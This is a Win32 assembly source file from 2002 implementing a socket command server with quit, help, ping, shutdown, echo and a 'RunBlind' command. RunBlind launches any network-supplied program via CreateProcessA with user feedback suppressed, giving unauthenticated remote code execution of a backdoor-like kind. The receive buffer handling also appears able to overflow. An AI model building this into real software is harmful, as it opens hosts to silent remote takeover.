;Copyright (C) Kevin Darlington, 2002

;=========================
CommandHandler:
  push ebp
  mov ebp, esp
  sub esp, commandSize
  pusha
    
  .Loop:
    mov edi, esp
    
    ;send prompt
    push dword 0x0
    push dword cmdPromptSize
    push dword cmdPrompt
    push dword [ebp+8]
    call [send]
    cmp eax, SOCKET_ERROR
    je near .End
        
    ;recv data
    push dword 0x0
    push dword 1024
    push dword edi
    push dword [ebp+8]
    call [recv]
    cmp eax, 0x0
    je .End
    cmp eax, SOCKET_ERROR
    je .End
    
    mov byte [edi+eax], 0x0 ;null the string
     
    ;parse data and call the appropriate label with relative parameters
    push dword edi
    push dword [ebp+8]
    call ParseCommand    
    cmp eax, 0x1
    je .NoCmd      ;No command
    cmp eax, 0x2
    je .Invalid    ;Invalid data
    
    jmp .Loop
    
    .NoCmd:
      push dword 0x0
      push dword noCmdErrorSize
      push dword noCmdError
      push dword [ebp+8]
      call [send]
      cmp eax, SOCKET_ERROR
      je .End
      jmp .Loop
      
    .Invalid:
      push dword 0x0
      push dword invalidErrorSize
      push dword invalidError
      push dword [ebp+8]
      call [send]
      cmp eax, SOCKET_ERROR
      je .End
      jmp .Loop
  
  .End:
%if DEBUG == 1
    call [WSAGetLastError]
    push dword eax
    call PrintNumber
%endif

    xor eax, eax
  
    popa
    add esp, commandSize
    pop ebp
    ret 4

;=========================
;ebp+8  = socket
;ebp+12 = command
;ebp-4  = length of command
;returns:
;         0 on success
;         1 on no command
;         2 on invalid command
ParseCommand:
  push ebp
  mov ebp, esp
  sub esp, commandSize+0x4
      
  ;copy the command over quickly
  mov edi, esp
  mov esi, [ebp+12] ;our first parameter
  mov ecx, commandSize
  cld
  rep movsb
  
  mov esi, esp
  
  ;Check command and make sure it's valid
  cmp byte [esi], 0x0
  je near .Invalid
  cmp byte [esi], 0xA
  je near .Invalid
  cmp byte [esi], 0xD
  je near .Invalid
  cmp byte [esi], 0x20 
  je near .Invalid
  
  ;This little algorithm:
  ;finds the length of the command
  ;removes newlines or clear (for single command only)
  ;finds what time of command it is (single or multiple)
  mov dword [ebp-4], 0x0
  .CmdInfo
    lodsb
    cmp al, 0xA
    je .Parse
    cmp al, 0xD
    je .Parse
    cmp al, 0x0
    je .Parse
    cmp al, 0x20
    je .Parse
    inc dword [ebp-4]
    jmp .CmdInfo
  
  ;only a single command, no parameters
  .Parse:
    mov byte [esi-1], 0x0
    
    xor ebx, ebx
    mov edi, esp
  .FindCommand:
    mov esi, [CMDStrings+ebx]
    cmp esi, 0x0
    je .NotFound
    jmp .CompareCmds
      
    .CompareCmds:
      mov ecx, [ebp-4]
      inc ecx
      mov edi, esp
      .Compare:
        lodsb
        cmp byte al, [edi] 
        je .CharMatched
        jmp .CharNotMatched
        
        .CharMatched:
          inc edi
          loop .Compare
          jmp .Found
        
        .CharNotMatched:
          add ebx, 0x4
          jmp .FindCommand    
 
  .Found:
    ;take out any clear's or newlines
    mov esi, esp
    add dword esi, [ebp-4]
    add dword esi, 0x1
    mov edi, esi
    .Remove:
      lodsb
      cmp al, 0xA
      je .Delete
      cmp al, 0xD
      je .Delete
      cmp al, 0x0
      je .CallLabel
      jmp .Remove
      
      .Delete:
        mov byte [esi-1], 0x0
        
    .CallLabel:
      push dword edi
      push dword [ebp+8]
      call [CMDLabels+ebx]
    
    mov eax, 0x0
    jmp .End
  
  .NotFound:
    mov eax, 0x1
    jmp .End
    
  .Invalid:
    mov eax, 0x2
    jmp .End
  
  .End:
    add esp, commandSize+0x4
    pop ebp
    ret 8


;------------------------------;    
;----CMD function interface----;
;ebp+8     = Socket Descriptor ; ;dword
;ebp+12    = parameters        ; ;dword
;ret 8                         ;
;------------------------------;

;=========================
CMD_Quit:
  push ebp
  mov ebp, esp
  
  push dword 0x0
  push dword quitSize
  push dword quit
  push dword [ebp+8]
  call [send] 
  
  push dword [ebp+8]
  call [closesocket]
  
  pop ebp
  ret 8
  
;=========================
CMD_Help:
  push ebp
  mov ebp, esp
  
  push ecx
  push esi
  
  mov byte [buffer], 0x0
  xor ecx, ecx
  .Loop:
    mov dword esi, [CMDStrings+ecx]
    cmp esi, 0x0
    je .End
    push dword esi
    push dword buffer
    call Strcat
    push dword space
    push dword buffer
    call Strcat
    add ecx, 0x4
    jmp .Loop
  
  .End:
    push dword crlf
    push dword buffer
    call Strcat
    
    push dword buffer
    call Strlen
    
    push dword 0x0
    push dword eax
    push dword buffer
    push dword [ebp+8]
    call [send]
  
    pop esi
    pop ecx
    
    pop ebp
    ret 8

;=========================
CMD_Ping:
  push ebp
  mov ebp, esp
  
  push dword 0x0
  push dword pongSize
  push dword pong
  push dword [ebp+8]
  call [send] 
  
  pop ebp
  ret 8
  
;=========================
CMD_Shutdown:
  push ebp
  mov ebp, esp
  
  push dword 0x0
  push dword shutdownSize
  push dword shutdown
  push dword [ebp+8]
  call [send] 
  
  push 0x0
  call [ExitProcess]
  
  pop ebp
  ret 8

;=========================
CMD_Update:
  push ebp
  mov ebp, esp
  
  pop ebp
  ret 8

;=========================
CMD_RunBlind:
  push ebp
  mov ebp, esp
  
  push dword 0x0
  push dword executingSize
  push dword executing
  push dword [ebp+8]
  call [send] 

  ;turn off hour glass
  mov dword [startupInfo+STARTUPINFO.dwFlags], STARTF_FORCEOFFFEEDBACK
    
  push dword processInfo
  push dword startupInfo
  push dword 0x0
  push dword 0x0
  push dword CREATE_NEW_PROCESS_GROUP ;if not in its own process group, will crash server
  push dword 0x0
  push dword 0x0
  push dword 0x0
  push dword 0x0
  push dword [ebp+12]
  call [CreateProcessA]
  
  cmp eax, 0x0
  je .Error
  jmp .Success
  
  .Error:
    push dword 0x0
    push dword runErrorSize
    push dword runError
    push dword [ebp+8]
    call [send] 
    jmp .End
    
  .Success:
    push dword 0x0
    push dword runSuccessSize
    push dword runSuccess
    push dword [ebp+8]
    call [send] 
    jmp .End
  
  .End:
    mov eax, 0x0
    pop ebp
    ret 8
    
;=========================
CMD_Echo:
  push ebp
  mov ebp, esp
  
  push dword [ebp+12]
  push dword buffer
  call Strcpy
  
  push dword crlf
  push dword buffer
  call Strcat
  
  push dword buffer
  call Strlen
  
  push dword 0x0
  push dword eax
  push dword buffer
  push dword [ebp+8]
  call [send] 
  
  pop ebp
  ret 8
